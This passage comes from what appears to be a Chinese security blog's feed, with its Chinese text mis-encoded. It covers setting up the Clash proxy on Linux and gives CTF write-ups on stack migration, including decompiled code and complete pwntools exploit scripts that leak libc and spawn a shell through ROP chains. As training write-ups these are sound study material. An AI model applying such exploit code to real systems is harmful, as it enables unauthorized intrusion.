rel="noopener">https://libc.blukat.me/</a><br>éƒ½æ˜¯åªæœ‰æœ‰ä¸¤ä¸ªæ³„éœ²åœ°å€ï¼Œå°±å¯ä»¥æŸ¥åˆ°å¯¹åº”çš„libcç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥ç»™å‡ºå…¶åŸä»¶ï¼Œæ¥ç€å°±å¯ä»¥è¿›è¡Œå…¶ä»–æ“ä½œã€‚</p><p>è¿˜æœ‰åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä¸€ä¸ªé¢˜ç›®ä¸å¥½è·å–åˆ°libcï¼Œé‚£ä¹ˆå¯ä»¥çœ‹çœ‹å…¶ä»–é¢˜ç›®çš„libcï¼Œæœ‰å¯èƒ½è¿™ä¸ªèµ›äº‹å¹³å°æœåŠ¡å™¨éƒ½æ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linuxä¸‹clashçš„ä½¿ç”¨</title>
    <link href="/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2020/02/14/linux%E4%B8%8Bclash%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linuxä¸‹clashçš„ä½¿ç”¨"><a href="#linuxä¸‹clashçš„ä½¿ç”¨" class="headerlink" title="linuxä¸‹clashçš„ä½¿ç”¨"></a>linuxä¸‹clashçš„ä½¿ç”¨</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡åªæ˜¯å¾ˆç®€å•è®°å½•ä¸€ä¸‹ï¼Œè‡ªå·±å¦‚ä½•ä½¿ç”¨clashçš„ã€‚å› ä¸ºå‘ç°ç»ˆç«¯è™½è¯´åœ¨æœ¬æœºä¸Šå·²ç»å¼€äº†ä»£ç†ï¼Œä½†æ˜¯ç»ˆç«¯æ‰§è¡Œå‘½ä»¤ä¸‹è½½ä¸œè¥¿çš„æ—¶å€™ååˆ†çš„å¡ï¼Œä»Šå¤©æ‰äº†è§£åˆ°ï¼ŒåŸæ¥ç»ˆç«¯çš„ä»£ç†æ˜¯å¦å¤–å¼€çš„ã€‚æ‰€ä»¥å°±å¼€å§‹æŠ˜è…¾ä¸€ä¸‹ï¼Œlinuxä¸‹clashçš„ä½¿ç”¨ï¼ˆæœ¬äººç”¨äº†å¾ˆä¹…äº†clashï¼Œæ‰€ä»¥ç›´æ¥çœ‹è¿™ä¸ªè½¯ä»¶äº†ï¼‰ã€‚</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>æ‰§è¡Œ<code>cd &amp;&amp; mkdir clash</code> åœ¨ç”¨æˆ·ç›®å½•ä¸‹åˆ›å»º clash æ–‡ä»¶å¤¹ã€‚<br>ä¸‹è½½é€‚åˆçš„ Clash äºŒè¿›åˆ¶æ–‡ä»¶å¹¶è§£å‹é‡å‘½åä¸º clash,ä¸€èˆ¬ä¸ªäººçš„64ä½ç”µè„‘ä¸‹è½½ clash-linux-amd64.tar.gz å³å¯ã€‚<br>åœ°å€ï¼š<a href="https://github.com/Dreamacro/clash/releases" target="_blank" rel="noopener">https://github.com/Dreamacro/clash/releases</a></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>åœ¨ç»ˆç«¯cdåˆ°ClashäºŒè¿›åˆ¶æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•,æŠŠClash é…ç½®æ–‡ä»¶ç»™ç§»è¿›å»ã€‚é…ç½®æ–‡ä»¶çš„åç§°è¦æ˜¯config.yaml<br><img src="/2020/02/14/linuxä¸‹clashçš„ä½¿ç”¨/images/15816946080116.jpg" srcset="/img/loading.gif" alt="-w286"></p><p>æˆ‘æ˜¯ç›´æ¥åˆ›å»ºäº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶å†™å…¥çš„è‡ªå·±çš„é…ç½®ï¼Œå› ä¸ºmacæœ¬æœºä¸€ç›´ç”¨è¿™ä¸ªè½¯ä»¶ï¼Œç„¶ååœ¨é…ç½®æ–‡ä»¶æ‰¾åˆ°ä¸»ä½¿ç”¨é‚£ä¸ªï¼Œç›´æ¥å¤åˆ¶é‚£ä¸ªè‡ªå·±ä½¿ç”¨ä»£ç†ç½‘ç«™åŠ è½½ä¸‹æ¥çš„é…ç½®ç»™config.yamlã€‚</p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p><code>chmod +x ./clash</code>åŠ æ‰§è¡Œæƒé™<br>æ‰§è¡Œ ./clash -d . å³å¯å¯åŠ¨ Clashï¼ŒåŒæ—¶å¯åŠ¨ HTTP ä»£ç†å’Œ Socks5 ä»£ç†ã€‚<br>ç„¶åè¿›å…¥è¿™ä¸ª<a href="http://clash.razord.top/" target="_blank" rel="noopener">http://clash.razord.top/</a> é“¾æ¥å¯ä»¥å¯¹ä»£ç†è¿›è¡Œä¸ªç®€å•ç®¡ç†<br><img src="/2020/02/14/linuxä¸‹clashçš„ä½¿ç”¨/images/15816952499188.jpg" srcset="/img/loading.gif" alt="-w794"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>æ‰“å¼€ç³»ç»Ÿè®¾ç½®ï¼Œé€‰æ‹©ç½‘ç»œï¼Œç‚¹å‡»ç½‘ç»œä»£ç†å³è¾¹çš„ âš™ æŒ‰é’®ï¼Œé€‰æ‹©æ‰‹åŠ¨ï¼Œå¡«å†™ HTTP å’Œ HTTPS ä»£ç†ä¸º 127.0.0.1:7890ï¼Œå¡«å†™ Socks ä¸»æœºä¸º 127.0.0.1:7891ï¼Œå³å¯å¯ç”¨ç³»ç»Ÿä»£ç†ã€‚<br><img src="file:///Volumes/data/chumenblog/source/images/15816953014396.jpg" srcset="/img/loading.gif" alt="-w409"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>ç»ˆç«¯å¼€å¯ä»£ç†<br><code>export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7891</code><br>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å³å¯ã€‚<br><img src="file:///Volumes/data/chumenblog/source/images/15816954013538.jpg" srcset="/img/loading.gif" alt="-w495"><br>å‡ºç°è¿™ä¸ªå°±æ˜¯ä»£ç†æˆåŠŸäº†ï¼Œç„¶åå°±ä¼šå‘ç°ç»ˆç«¯ä¸‹è½½ä¸œè¥¿çš„ç¥é€Ÿã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Stack Migrationé¢˜ç›®ç»ƒä¹ </title>
    <link href="/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/02/11/Stack%20Migration%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Migrationé¢˜ç›®ç»ƒä¹ "><a href="#Stack-Migrationé¢˜ç›®ç»ƒä¹ " class="headerlink" title="Stack Migrationé¢˜ç›®ç»ƒä¹ "></a>Stack Migrationé¢˜ç›®ç»ƒä¹ </h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•å‡ é“Stack Migrationçš„ç»ƒä¹ é¢˜ã€‚</p><h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><h3 id="æŸ¥çœ‹ä¿æŠ¤å’Œarch"><a href="#æŸ¥çœ‹ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥çœ‹ä¿æŠ¤å’Œarch"></a>æŸ¥çœ‹ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      <span class="hljs-function">No <span class="hljs-title">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span></span></code></pre></div><p>32ä½ç¨‹åºï¼Œå¼€äº†nxå’ŒCanaryä¿æŠ¤ã€‚</p><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">int</span> de_s; <span class="hljs-comment">// [esp+18h] [ebp-28h]</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Eh] [ebp-22h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> de_length; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x1E</span>u);  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Authenticate : "</span>);  _isoc99_scanf(<span class="hljs-string">"%30s"</span>, &amp;s);  <span class="hljs-built_in">memset</span>(&amp;input, <span class="hljs-number">0</span>, <span class="hljs-number">0xC</span>u);  de_s = <span class="hljs-number">0</span>;  de_length = Base64Decode((<span class="hljs-keyword">int</span>)&amp;s, &amp;de_s);     <span class="hljs-comment">// v6 = è§£ç åçš„é•¿åº¦</span>  <span class="hljs-keyword">if</span> ( de_length &gt; <span class="hljs-number">0xC</span> )  &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Wrong Length"</span>);  &#125;  <span class="hljs-keyword">else</span>  &#123;    <span class="hljs-built_in">memcpy</span>(&amp;input, de_s, de_length);  <span class="hljs-comment">// æ‰§è¡Œå®Œï¼ŒæŠŠè§£ç åçš„å­—æ®µï¼Œæ”¾å…¥inputçš„bsså†…å­˜ä¸Š</span>    <span class="hljs-keyword">if</span> ( auth(de_length) == <span class="hljs-number">1</span> )      correct();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>ï¼ˆå…¶ä¸­å·²ç»æ”¹äº†éƒ¨åˆ†å˜é‡çš„åç§°æ–¹ä¾¿è¯»ä»£ç ï¼‰<br>æµç¨‹å°±æ˜¯æ¥å—ä¸€æ®µbase64ç¼–ç è¿‡çš„å­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œä¸€ä¸‹è§£ç ï¼Œè§£ç è¿”å›é•¿åº¦ç»™å˜é‡ï¼Œä¸”åšä¸12å¤§å°çš„æ¯”è¾ƒï¼Œå¦‚æœè§£ç åå¤§äº12ï¼Œå°±ç›´æ¥é€€å‡ºç¨‹åºï¼Œå¹¶ä¸”è§£ç çš„å­—ç¬¦ä¸²æ˜¯æ”¾åœ¨inputçš„è¿™ä¸ªå…¨å±€å˜é‡é‡Œï¼š<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814303737109.jpg" srcset="/img/loading.gif" alt="-w601"><br>æ¥ç€è¿›å…¥authå‡½æ•°åˆ†æä¸€ä¸‹ï¼š</p><div class="hljs"><pre><code class="hljs c">_BOOL4 __<span class="hljs-function">cdecl <span class="hljs-title">auth</span><span class="hljs-params">(<span class="hljs-keyword">int</span> length)</span></span>&#123;  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [esp+14h] [ebp-14h]</span>  <span class="hljs-keyword">char</span> *s2; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+20h] [ebp-8h]</span>  <span class="hljs-built_in">memcpy</span>(&amp;v4, &amp;input, length);  s2 = (<span class="hljs-keyword">char</span> *)calc_md5((<span class="hljs-keyword">int</span>)&amp;v2, <span class="hljs-number">12</span>);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"hash : %s\n"</span>, s2);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcmp</span>(<span class="hljs-string">"f87cd601aa7fedca99018a8be88eda34"</span>, s2) == <span class="hljs-number">0</span>;&#125;</code></pre></div><p>å¯ä»¥å‘ç°å…¶æ˜¯ä¸€ä¸ªmd5åŠ å¯†åï¼Œç„¶åè·Ÿåé¢é‚£ä¸²å­—ç¬¦ä¸²å¯¹æ¯”ã€‚å¹¶ä¸”çœ‹ä¸€ä¸‹v4å˜é‡ï¼š<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814310284289.jpg" srcset="/img/loading.gif" alt="-w407"><br>å‘ç°memcpyè¿™ä¸ªå‡½æ•°ä¼šå¼•èµ·æ ˆæº¢å‡ºï¼Œä½†æ˜¯å¯æ§çš„åªæ˜¯12-8 = 4å­—èŠ‚ã€‚<img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814313605840.jpg" srcset="/img/loading.gif" alt="-w1241"><br>ç„¶åè¾“å…¥12ä½â€˜1â€™ï¼Œç¼–ç åæ”¾å…¥ç¨‹åºï¼Œå‘ç°æœ€åçš„4ä¸ªå­—èŠ‚è¢«æ”¾å…¥äº†ebpï¼Œæ­£å¥½è¿™ä¸‹å°±å¯ä»¥æ§åˆ¶ebpäº†ã€‚æ¥ç€å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼š</p><h3 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>æ§åˆ¶å¥½è¿™ä¸ªebpï¼Œç„¶åç”±äºè¿™ä¸ªç¨‹åºä¸­ï¼Œauthå‡½æ•°æœ€åæœ‰ä¸€ä¸ªleave ret çš„gadgetï¼Œmainå‡½æ•°ä¹Ÿæœ‰ä¸€ä¸ªï¼Œæ­£å¥½æ»¡è¶³æˆ‘ä»¬æ¥Stack Migrationã€‚åœ¨æ ˆä¸Šæ‘†æ”¾çš„ç»“æ„ä¸ºï¼š<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814316930734.jpg" srcset="/img/loading.gif" alt="-w353"><br>åˆ°æ—¶å€™ç”±äºmemcpyä¼šå¤åˆ¶è¿™ä¸ªè€æ ˆçš„å‰12ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç„¶ånew espæŒ‡å‘çš„æ˜¯å›ºå®šä½ç½®inputã€‚ç„¶åä¸¤ä¸ªleave gadgetå³å¯</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *# <span class="hljs-built_in">io</span> = process(<span class="hljs-string">'./login'</span>)<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29026</span>)system_add = <span class="hljs-number">0x08049284</span>buf = <span class="hljs-number">0x0811EB40</span><span class="hljs-built_in">io</span>.recvuntil(<span class="hljs-string">'e : '</span>)p = <span class="hljs-string">'aaaa'</span> + p32(system_add) + p32(buf)<span class="hljs-built_in">io</span>.sendline(b64encode(p))<span class="hljs-built_in">io</span>.interactive()</code></pre></div><h2 id="å®‰æ’æœˆèµ›-over-over"><a href="#å®‰æ’æœˆèµ›-over-over" class="headerlink" title="å®‰æ’æœˆèµ›_over.over"></a>å®‰æ’æœˆèµ›_over.over</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch"><a href="#æŸ¥ä¿æŠ¤å’Œarch" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/ichunqiu/stack_pivot/ah_over/over.over'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span></code></pre></div><p>64ä½ï¼Œåªå¼€äº†nx</p><h3 id="idaåˆ†æ-1"><a href="#idaåˆ†æ-1" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><div class="hljs"><pre><code class="hljs undefined">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  setvbuf(stdin, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);  setvbuf(stdout, <span class="hljs-number">0</span>LL, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>LL);  <span class="hljs-keyword">while</span> ( sub_400676() )    ;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>LL;&#125;</code></pre></div><p>ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œä¸»è¦æ ¸å¿ƒå°±åœ¨whileåŒ…è£¹çš„å‡½æ•°:</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400676</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-50h]</span>  <span class="hljs-built_in">memset</span>(&amp;buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>uLL);  <span class="hljs-built_in">putchar</span>(<span class="hljs-string">'&gt;'</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x60</span>uLL);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(&amp;buf);&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°æº¢å‡ºå¯æ§è‡ªå·±åªæœ‰8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªgadgetï¼Œæ˜æ˜¾éœ€è¦Stack Migrationï¼Œ<br>é‚£ä¹ˆå°±å¾—æ§åˆ¶å¥½ebpï¼Œpaddingå³ä¸º0x50ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ç›®æ²¡æœ‰ç»™æˆ‘ä»¬å›ºå®šçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å…¨å±€å˜é‡å¯ç”¨ï¼Œé‚£å°±æƒ³åŠæ³•çœ‹æ ˆåç§»äº†ã€‚</p><p>å¯ä»¥çœ‹åˆ°æ˜¯readå‡½æ•°ï¼Œå’Œputså‡½æ•°çš„æ­é…ï¼Œå½“å¾€é‡Œé¢å¡0x50å­—èŠ‚å­—ç¬¦æ˜¯ä¸ä¼šæ·»åŠ ä¸Šâ€™\x00â€™çš„:<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814741030442.jpg" srcset="/img/loading.gif" alt="-w781"><br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814741289950.jpg" srcset="/img/loading.gif" alt="-w649"></p><p>ç„¶åç”¨putså‡½æ•°è¾“å‡ºæ—¶ä¼šæŠŠebpé‡Œé¢çš„å€¼ä¹Ÿä¼šè¾“å‡ºå‡ºæ¥ã€‚è¿™ä¸‹æ ˆåç§»æ˜¯å›ºå®šçš„ï¼Œå°±å¯ä»¥åœ¨readçš„æ—¶å€™å¾€é‡Œé¢å¡ropé“¾ï¼Œä¾é åç§»æ¥è·³ä¸Šå»æ‰§è¡Œå°±å¯ä»¥äº†ã€‚<br><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15814770925207.jpg" srcset="/img/loading.gif" alt="-w842"><br>ç®—ä¸€ä¸‹mainçš„ebpä¸ç°åœ¨çš„espå·®è·æ˜¯112ä¸ªå­—èŠ‚ã€‚è®©ebp-112å°±ç­‰äºespæŒ‡å‘äº†æ ˆé¡¶espã€‚</p><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><p>å…ˆç»™ç¨‹åº0x50ä¸ªå­—èŠ‚ï¼Œç„¶åæ¥æ”¶ä¸‹mainçš„ebpå€¼ã€‚ç„¶åç¨‹åºç”±äºwhileå¾ªç¯å†æ¬¡ï¼Œè¿›å…¥è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ—¶å€™é€ropé“¾ï¼Œç¬¬ä¸€ä¸ªropé“¾å¯ä»¥å…ˆæ³„éœ²ä¸‹putsçš„å†…å­˜åœ°å€ï¼Œç„¶åè®¡ç®—libcçš„åœ°å€ï¼Œè¿”å›åœ°å€å†™æˆä¸»å‡½æ•°startï¼Œæ¸…ç†ä¸‹æ ˆã€‚ç„¶åç¬¬äºŒæ¬¡è¯»çš„æ—¶å€™ï¼Œé€è¿‡å»system(/bin/sh)çš„ropé“¾å³å¯ã€‚ç¨‹åºæ¯æ¬¡è¯»ï¼Œæ„é€ å¥½ropé“¾çš„æ—¶å€™ï¼Œè¦ä¿è¯é€è¿‡å»80å­—èŠ‚ï¼Œç„¶åæ§åˆ¶ebp ä¸ºæ ˆé¡¶espï¼Œè¿˜æœ‰åŠ ä¸Šleave çš„gadgetï¼Œè¿™ä¸‹ä¸¤ä¸ªleaveçš„gadgetå°±è®©ç¨‹åºè·³å›æ ˆå¤´çš„ä¸‹ä¸ª8ä¸ªå­—èŠ‚ï¼Œå¼€å§‹æ‰§è¡Œropé“¾ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'amd64'</span>io = process(<span class="hljs-string">'./over.over'</span>)e = ELF(<span class="hljs-string">'./over.over'</span>)l = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)leave_ret = <span class="hljs-number">0x004006be</span> pop_rdi_ret = <span class="hljs-number">0x0400793</span>put_got = e.got[<span class="hljs-string">'puts'</span>]put_plt = e.symbols[<span class="hljs-string">'puts'</span>]padding = <span class="hljs-number">80</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendafter(<span class="hljs-string">"&gt;"</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">80</span>)<span class="hljs-comment"># stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70</span>stack = u64((io.recvline())[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x70</span>io.readuntil(<span class="hljs-string">'&gt;'</span>)print(hex(stack))p = flat([<span class="hljs-string">'11111111'</span>,pop_rdi_ret,put_got,put_plt,<span class="hljs-number">0x000400580</span>,(<span class="hljs-number">80</span><span class="hljs-number">-40</span>)*<span class="hljs-string">'1'</span>,stack,leave_ret])raw_input(<span class="hljs-string">'-&gt;'</span>)io.send(p)libc = u64(io.recvuntil(<span class="hljs-string">"\x7f"</span>)[<span class="hljs-number">-6</span>: ].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>)) - l.symbols[<span class="hljs-string">'puts'</span>]print(hex(libc))io.sendafter(<span class="hljs-string">"&gt;"</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">80</span>)stack = u64((io.recvline())[<span class="hljs-number">80</span>:<span class="hljs-number">86</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0x70</span>print(hex(stack))io.readuntil(<span class="hljs-string">'&gt;'</span>)system_add = libc + l.symbols[<span class="hljs-string">'system'</span>]binsh_add = libc + l.search(<span class="hljs-string">'/bin/sh\x00'</span>).next()p = flat([<span class="hljs-string">'22222222'</span>,pop_rdi_ret,binsh_add,system_add,(<span class="hljs-number">80</span><span class="hljs-number">-4</span>*<span class="hljs-number">8</span>)*<span class="hljs-string">'2'</span>,stack,leave_ret])io.send(p)io.interactive()</code></pre></div><h2 id="HITCON-training-lab6"><a href="#HITCON-training-lab6" class="headerlink" title="HITCON_training_lab6"></a>HITCON_training_lab6</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-keyword">int</span> count = <span class="hljs-number">1337</span> ;<span class="hljs-keyword">char</span> *t= <span class="hljs-string">"Z\xc3"</span> ;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">if</span>( count!=<span class="hljs-number">1337</span> )&#123;    _exit(<span class="hljs-number">1</span>);&#125;count++ ;<span class="hljs-keyword">char</span> buf[<span class="hljs-number">48</span>];setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Try your best : "</span> );read(<span class="hljs-number">0</span>, buf,<span class="hljs-number">128</span>);<span class="hljs-keyword">return</span> ;&#125;</code></pre></div><p><code>gcc -m32 -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration</code> ç¼–è¯‘å‘½ä»¤ã€‚<br>ç„¶åå°±ä¸åˆ†æäº†ï¼Œå‰é¢ç»ƒä¹ 64ä½æ—¶å€™å†™çš„é‚£ä¸ªåšå®¢å·²ç»è®°å½•å¾ˆæ¸…æ¥šäº†ï¼Œè¿™é‡Œåªè®°å½•ä¸‹expã€‚</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs undefined">from pwn import *context.arch = 'i386'context.log_level = 'debug'<span class="hljs-comment"># io = process('./migration')</span>io = remote('127.0.0.1',4000)e = ELF('./migration')l = ELF('/lib/i386-linux-gnu/libc-2.23.so')padding = 40puts_plt = e.symbols['puts']puts_got = e.got['puts']read = e.symbols['read']leave_ret = 0x08048418buf1 = 0x0804b000 - 0x100buf2 = buf1 - 0x50pop_edx_ret = 0x0804836dp = 'a' * padding + flat([buf1,read,leave_ret,0,buf1,0x50])<span class="hljs-section">io.readuntil(':\n')</span>io.send(p)p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50])sleep(0.1)raw_input('-&gt;')io.sendline(p)puts_add = u32(io.recv(4))libc = puts_add - l.symbols['puts']print(hex(libc))system_add = l.symbols['system'] + libcbinsh_add = l.search('/bin/sh\x00').next() + libcp = flat([buf1,system_add,system_add,binsh_add])raw_input('-&gt;')<span class="hljs-comment"># sleep(0.1)</span>io.sendline(p)io.interactive()</code></pre></div><h2 id="spwn"><a href="#spwn" class="headerlink" title="spwn"></a>spwn</h2><h3 id="æŸ¥ä¿æŠ¤å’Œarch-1"><a href="#æŸ¥ä¿æŠ¤å’Œarch-1" class="headerlink" title="æŸ¥ä¿æŠ¤å’Œarch"></a>æŸ¥ä¿æŠ¤å’Œarch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">  RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">  Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">  NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">  PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="å°è¯•è¿è¡Œ"><a href="#å°è¯•è¿è¡Œ" class="headerlink" title="å°è¯•è¿è¡Œ"></a>å°è¯•è¿è¡Œ</h3><p><img src="/2020/02/11/Stack Migrationé¢˜ç›®ç»ƒä¹ /images/15817739064330.jpg" srcset="/img/loading.gif" alt="-w602"></p><h3 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p>ç›´æ¥çœ‹æ¼æ´å‡½æ•°</p><div class="hljs"><pre><code class="hljs undefined">ssize_t vul_function()&#123;  size_t v0; <span class="hljs-comment">// eax</span>  size_t v1; <span class="hljs-comment">// eax</span>  char buf; <span class="hljs-comment">// [esp+0h] [ebp-18h]</span>  v0 = strlen(m1);  write(<span class="hljs-number">1</span>, m1, v0);                             <span class="hljs-comment">// Hello good Ctfer</span>  